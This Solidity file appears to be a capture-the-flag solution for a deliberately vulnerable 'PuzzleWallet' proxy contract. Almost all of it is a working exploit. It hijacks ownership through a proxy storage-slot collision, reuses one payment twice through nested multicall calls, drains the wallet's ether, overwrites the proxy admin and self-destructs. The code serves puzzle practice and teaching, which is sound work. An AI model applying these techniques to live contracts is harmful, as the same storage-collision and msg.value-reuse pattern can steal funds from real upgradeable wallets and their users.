// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./PuzzleWallet.sol";

contract Solver {
    bytes[] private data;
    bytes[] private data2;

    function solve(address payable instance) external payable {
        require(msg.value == 0.001 ether, "send only 0.001 ether");

        PuzzleProxy proxy = PuzzleProxy(instance);
        PuzzleWallet wallet = PuzzleWallet(instance);
        address self = address(this);

        // become the owner of the PuzzleWallet
        proxy.proposeNewAdmin(self);
        require(wallet.owner() == self, "couldn't claim ownership");

        // whitelist this contract
        wallet.addToWhitelist(self);

        require(wallet.whitelisted(self), "couldn't whitelist self");

        // deposit once, record twice!
        data2.push(abi.encodeCall(wallet.deposit, ()));
        data.push(abi.encodeCall(wallet.deposit, ()));
        data.push(abi.encodeCall(wallet.multicall, (data2)));
        wallet.multicall{value: msg.value}(data);

        require(
            wallet.balances(self) == 0.002 ether,
            "couldn't reuse msg.value"
        );

        // drain the wallet!
        wallet.execute(self, 0.002 ether, "");

        require(instance.balance == 0, "couldn't drain the wallet");

        // finally update the admin by updating the maxBalance
        wallet.setMaxBalance(uint160(bytes20(msg.sender)));

        require(proxy.admin() == msg.sender, "couldn't change the admin");

        selfdestruct(payable(msg.sender));
    }

    receive() external payable { }
}